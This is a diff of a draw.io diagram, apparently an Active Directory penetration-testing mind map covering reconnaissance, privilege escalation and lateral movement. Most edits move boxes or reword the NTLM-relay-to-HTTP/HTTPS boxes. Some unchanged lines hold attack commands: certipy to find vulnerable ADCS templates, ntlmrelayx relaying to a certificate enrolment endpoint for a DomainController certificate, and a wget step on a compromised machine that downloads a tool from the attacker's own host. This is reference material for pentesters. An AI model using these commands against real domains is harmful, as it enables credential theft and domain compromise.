@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-11-20T14:14:06.335Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0" etag="piLXWbUhM8cdRXW00KCv" version="22.1.3" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2023-11-21T10:07:37.997Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0" etag="_srcVvFttyijJ23mDpmZ" version="22.1.3" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -268,18 +268,18 @@
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="_LFIwpbgAgwoRebmZAz1-4" value="&lt;div&gt;&lt;b&gt;ADCS&lt;br&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;ESC8&lt;/b&gt; : web enrollement is up ?&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy find -u user@domain.local -p pass -dc-ip [ip] -vulnerable&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="903" y="700" width="360" height="90" as="geometry" />
+          <mxGeometry x="1060" y="700" width="360" height="90" as="geometry" />
         </mxCell>
         <mxCell id="_LFIwpbgAgwoRebmZAz1-12" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;fillColor=#e51400;strokeColor=#B20000;" parent="1" source="_LFIwpbgAgwoRebmZAz1-7" target="_LFIwpbgAgwoRebmZAz1-9" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;relay to the web enrollement ADCS&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;ntlmrelay.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" id="_LFIwpbgAgwoRebmZAz1-7">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="1297" y="710" width="180" height="70" as="geometry" />
+            <mxGeometry x="1540" y="710" width="180" height="70" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="_LFIwpbgAgwoRebmZAz1-9" value="Get the certificate" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="1512" y="715" width="120" height="60" as="geometry" />
+          <mxGeometry x="1755" y="715" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-1" value="Prerequisites :SMB Signing &lt;b&gt;not REQUIRED&lt;/b&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
           <mxGeometry x="750" y="600" width="150" height="60" as="geometry" />
@@ -290,16 +290,14 @@
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-19" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#cc0000;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-10" target="hefA_bYV9p1Cq4kSP_zY-17" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-10" value="&lt;div&gt;Relay to HTTP&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
+        <mxCell id="hefA_bYV9p1Cq4kSP_zY-10" value="&lt;div&gt;Relay to HTTP&lt;br&gt;&lt;/div&gt;&amp;nbsp;or HTTPS" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
           <mxGeometry x="570" y="720" width="130" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-18" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeWidth=3;strokeColor=#cc0000;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-17" edge="1">
-          <mxGeometry relative="1" as="geometry">
-            <mxPoint x="900" y="750" as="targetPoint" />
-          </mxGeometry>
+        <mxCell id="9qDSBSOxF81Upe2ff3Q7-1" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="hefA_bYV9p1Cq4kSP_zY-17" target="_LFIwpbgAgwoRebmZAz1-4">
+          <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-17" value="no Prerequisites" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
-          <mxGeometry x="738" y="720" width="120" height="60" as="geometry" />
+        <mxCell id="hefA_bYV9p1Cq4kSP_zY-17" value="&lt;div&gt;no Prerequisites for HTTP&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;EAP enabled for HTTPS&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
+          <mxGeometry x="820" y="710" width="182" height="80" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-24" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-21" target="hefA_bYV9p1Cq4kSP_zY-22" edge="1">
           <mxGeometry relative="1" as="geometry" />
@@ -329,7 +327,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="from creds" id="DHAbqxUyTUS8Uim03K_V">
-    <mxGraphModel dx="1991" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="2261" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -700,7 +698,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="Privesc" id="g_WdtopXuEi5G3ynW-Q2">
-    <mxGraphModel dx="1434" dy="793" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -734,7 +732,7 @@
         <mxCell id="eydW96J8nSPCopO3k54l-5" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote:wget http://my-ip:8000/&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="220" y="195" width="230" height="110" as="geometry" />
         </mxCell>
-        <mxCell id="r-YRKmCkZa-VsO_QLyJS-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="eydW96J8nSPCopO3k54l-2">
+        <mxCell id="r-YRKmCkZa-VsO_QLyJS-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="eydW96J8nSPCopO3k54l-2" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="qmehafYx0e8W1bQMVf-2-1" value="&lt;div&gt;SEImpersonate Privilege OR &lt;br&gt;&lt;div&gt;&lt;code&gt;SeAssignPrimaryToken&lt;/code&gt;&lt;/div&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
@@ -750,7 +748,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="Bonnes pratiques" id="IZ3QSceBzRdTOQ4elwdQ">
-    <mxGraphModel dx="2261" dy="-498" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="2261" dy="-499" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -823,7 +821,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="Lateral mouvement" id="8egK0x-ltnkDFjprNt1K">
-    <mxGraphModel dx="1434" dy="671" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
